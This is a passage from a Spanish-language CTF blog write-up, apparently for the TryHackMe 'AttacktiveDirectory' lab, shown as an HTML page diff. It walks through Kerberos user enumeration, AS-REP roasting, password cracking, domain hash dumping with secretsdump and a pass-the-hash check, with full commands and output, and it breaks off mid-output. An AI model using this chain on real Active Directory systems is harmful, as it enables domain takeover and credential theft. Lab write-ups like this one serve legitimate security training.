@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe - AttactiveDirectory (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="TryHackMe - AttactiveDirectory (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/tryhackme/machines/medium/2024/12/27/ad.html" />
+<meta property="og:url" content="http://localhost:4000/tryhackme/machines/medium/2024/12/27/ad.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-27T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe - AttactiveDirectory (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-12-27T00:00:00-06:00","datePublished":"2024-12-27T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"TryHackMe - AttactiveDirectory (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/tryhackme/machines/medium/2024/12/27/ad.html"},"url":"http://localhost:4000/tryhackme/machines/medium/2024/12/27/ad.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">TryHackMe - AttactiveDirectory (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-12-27T00:00:00-06:00" itemprop="datePublished">
+        Dec 27, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f38b047a2a7089147766099dffeb8a5d.png" />
+</p>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p88</span>,135,139,389,464,593,3389,5985,47001,49664,49665,49667,49669,49672,49675,49676 10.10.161.28 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-27 20:17 CST
+Nmap scan report <span class="k">for </span>10.10.161.28
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-12-27 19:54:18Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-12-27T19:55:16+00:00
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>AttacktiveDirectory.spookysec.local
+| Not valid before: 2024-12-26T19:52:32
+|_Not valid after:  2025-06-27T19:52:32
+|_ssl-date: 2024-12-27T19:55:29+00:00<span class="p">;</span> <span class="nt">-6h23m28s</span> from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb2-security-mode: SMB: Couldn<span class="s1">'t find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+|_clock-skew: mean: -6h23m29s, deviation: 1s, median: -6h23m30s
+</span></code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Vemos que estamos ante un Windows 10.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.161.28 spookysec.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.161.28 spookysec.local
+</code></pre></div></div>
+
+<ul>
+  <li>De momento no vemos nada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-N</span> <span class="nt">-L</span> 10.10.161.28
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.161.28 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>En el room mencionan el uso de <code class="language-plaintext highlighter-rouge">kerberos</code> así que vamos a usarlo para enumerar usuarios del Dominio <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a>.</p>
+  </li>
+  <li>
+    <p>Vamos a usar un diccionario que contenga nombres de usuarios.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> spookysec.local <span class="nt">--dc</span> 10.10.161.28 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 12/27/24 - Ronnie Flathers @ropnop
+
+2024/12/27 20:25:11 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/12/27 20:25:11 <span class="o">&gt;</span>  	10.10.161.28:88
+
+2024/12/27 20:25:11 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       svc-admin@spookysec.local
+2024/12/27 20:25:11 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 james@spookysec.local
+2024/12/27 20:25:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 James@spookysec.local
+2024/12/27 20:25:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 robin@spookysec.local
+2024/12/27 20:25:36 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 darkstar@spookysec.local
+2024/12/27 20:25:46 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 administrator@spookysec.local
+2024/12/27 20:26:08 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 backup@spookysec.local
+2024/12/27 20:26:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 paradox@spookysec.local
+2024/12/27 20:27:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 JAMES@spookysec.local
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregarlos a una lista.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>users.txt
+svc-admin
+james
+robin
+darkstar
+administrator
+backup
+paradox
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos hacer un <code class="language-plaintext highlighter-rouge">ASRPRoast Attack</code> ya que tenemos usuarios <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a>.</p>
+  </li>
+  <li>
+    <p>Tenemos un hash.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt spookysec.local/
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow<span class="o">()</span> is deprecated and scheduled <span class="k">for </span>removal <span class="k">in </span>a future version. Use timezone-aware objects to represent datetimes <span class="k">in </span>UTC: datetime.datetime.now<span class="o">(</span>datetime.UTC<span class="o">)</span><span class="nb">.</span>
+  now <span class="o">=</span> datetime.datetime.utcnow<span class="o">()</span> + datetime.timedelta<span class="o">(</span><span class="nv">days</span><span class="o">=</span>1<span class="o">)</span>
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-admin</span>@SPOOKYSEC.LOCAL:aa8759210952742c83330aad06aa9409<span class="nv">$e4a83c2507a6f8dc5518485920e7464080f1ed275d1b628c763e6d05700f2065f8e3bbc71a26fbc94fdbbf9cd988d6055ffa4a7b3c1d5b4277b18611629434c725b4ee316746322566eb784844c6ed9a1fb958b32e19bfcd890cc18a99b7b2c365bea11de398915b9e821bdd6805143923c2ea88823d05d484decc8f2eb18d5212d4eb993cb9d108df138754dd4297aa65569c7ffe8251684b9499d298c8627847924e6ffb05a042e092d985d2dd136277f1308967c1cbcbf583366c675e6b27809c67e5a8a7ac231e985078a936a6fe3b3b6d8e43c37f2ec6b73684cf634036137666a7ca84fbc2ef831218db1a9374ae3d</span>
+<span class="o">[</span>-] User james doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User robin doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User darkstar doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User backup doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User paradox doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a crackearlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+management2005   <span class="o">(</span><span class="nv">$krb5asrep$23$svc</span><span class="nt">-admin</span>@SPOOKYSEC.LOCAL<span class="o">)</span>     
+1g 0:00:00:09 DONE <span class="o">(</span>2024-12-27 20:30<span class="o">)</span> 0.1071g/s 625704p/s 625704c/s 625704C/s manaia05..man3333
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos credenciales podemos enumerar por smb.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28 <span class="nt">-u</span> svc-admin <span class="nt">-p</span> management2005 <span class="nt">--shares</span>
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span>+] spookysec.local<span class="se">\s</span>vc-admin:management2005
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  Share           Permissions     Remark
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  backup          READ            
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  C<span class="nv">$ </span>                             Default share
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a conectarnos a <code class="language-plaintext highlighter-rouge">backup</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.161.28/backup <span class="nt">-U</span> svc-admin <span class="nt">--password</span> management2005
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sat Apr  4 13:08:39 2020
+  ..                                  D        0  Sat Apr  4 13:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 13:08:53 2020
+
+		8247551 blocks of size 4096. 3564729 blocks available
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a descargar eso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get backup_credentials.txt 
+getting file <span class="se">\b</span>ackup_credentials.txt of size 48 as backup_credentials.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta en base64 pero al decodear es una contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+backup@spookysec.local:backup2517860  
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que son validas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28 <span class="nt">-u</span> backup <span class="nt">-p</span> backup2517860
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span>+] spookysec.local<span class="se">\b</span>ackup:backup2517860 
+</code></pre></div></div>
+
+<ul>
+  <li>Si nos vamos al <code class="language-plaintext highlighter-rouge">Task 7</code> nos dice que usemos <code class="language-plaintext highlighter-rouge">secretsdump.py</code> y nos dan la siguiente información útil.</li>
+</ul>
+
+<blockquote>
+  <p>Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account “backup” gets us thinking. What is this the backup account to? Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes Knowing this, we can use another tool within Impacket called “secretsdump.py”. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-secretsdump WORKGROUP/backup:backup2517860@10.10.161.28
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local<span class="se">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local<span class="se">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local<span class="se">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local<span class="se">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local<span class="se">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local<span class="se">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local<span class="se">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local<span class="se">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local<span class="se">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local<span class="se">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local<span class="se">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local<span class="se">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local<span class="se">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:b0d3f50f1016da643c34d840ad4af261:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
+Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
+Administrator:des-cbc-md5:2079ce0e5df189ad
+krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
+krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
+krbtgt:des-cbc-md5:b94f97e97fabbf5d
+spookysec.local<span class="se">\s</span>kidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
+spookysec.local<span class="se">\s</span>kidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
+spookysec.local<span class="se">\s</span>kidy:des-cbc-md5:b092a73e3d256b1f
+spookysec.local<span class="se">\b</span>reakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
+spookysec.local<span class="se">\b</span>reakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
+spookysec.local<span class="se">\b</span>reakerofthings:des-cbc-md5:7a976bbfab86b064
+spookysec.local<span class="se">\j</span>ames:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
+spookysec.local<span class="se">\j</span>ames:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
+spookysec.local<span class="se">\j</span>ames:des-cbc-md5:dc971f4a91dce5e9
+spookysec.local<span class="se">\o</span>ptional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
+spookysec.local<span class="se">\o</span>ptional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
+spookysec.local<span class="se">\o</span>ptional:des-cbc-md5:8c6e2a8a615bd054
+spookysec.local<span class="se">\s</span>herlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
+spookysec.local<span class="se">\s</span>herlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
+spookysec.local<span class="se">\s</span>herlocksec:des-cbc-md5:08dca4cbbc3bb594
+spookysec.local<span class="se">\d</span>arkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
+spookysec.local<span class="se">\d</span>arkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
+spookysec.local<span class="se">\d</span>arkstar:des-cbc-md5:758af4d061381cea
+spookysec.local<span class="se">\O</span>ri:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
+spookysec.local<span class="se">\O</span>ri:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
+spookysec.local<span class="se">\O</span>ri:des-cbc-md5:1c8f79864654cd4a
+spookysec.local<span class="se">\r</span>obin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
+spookysec.local<span class="se">\r</span>obin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
+spookysec.local<span class="se">\r</span>obin:des-cbc-md5:89a7c2fe7a5b9d64
+spookysec.local<span class="se">\p</span>aradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
+spookysec.local<span class="se">\p</span>aradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
+spookysec.local<span class="se">\p</span>aradox:des-cbc-md5:83988983f8b34019
+spookysec.local<span class="se">\M</span>uirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
+spookysec.local<span class="se">\M</span>uirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
+spookysec.local<span class="se">\M</span>uirland:des-cbc-md5:cb8a4a3431648c86
+spookysec.local<span class="se">\h</span>orshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
+spookysec.local<span class="se">\h</span>orshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
+spookysec.local<span class="se">\h</span>orshark:des-cbc-md5:a823497a7f4c0157
+spookysec.local<span class="se">\s</span>vc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
+spookysec.local<span class="se">\s</span>vc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
+spookysec.local<span class="se">\s</span>vc-admin:des-cbc-md5:2c4543ef4646ea0d
+spookysec.local<span class="se">\b</span>ackup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
+spookysec.local<span class="se">\b</span>ackup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
+spookysec.local<span class="se">\b</span>ackup:des-cbc-md5:d601e9469b2f6d89
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:des-cbc-md5:e09e4683ef4a4ce9
+ATTACKTIVEDIREC<span class="nv">$:</span>aes256-cts-hmac-sha1-96:2e25b4c046667051ea9bebf92b92767970d483b2f83f07770a0e7b05dc3fee26
+ATTACKTIVEDIREC<span class="nv">$:</span>aes128-cts-hmac-sha1-96:0f2ab043451fb33305099592a4bb08d9
+ATTACKTIVEDIREC<span class="nv">$:</span>des-cbc-md5:43750b80807a3d02
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos el hash <code class="language-plaintext highlighter-rouge">nt</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> que es el mas importante vamos a comprobar si es valido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 0e0363213e37b94221497260b0bcb4fc
+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
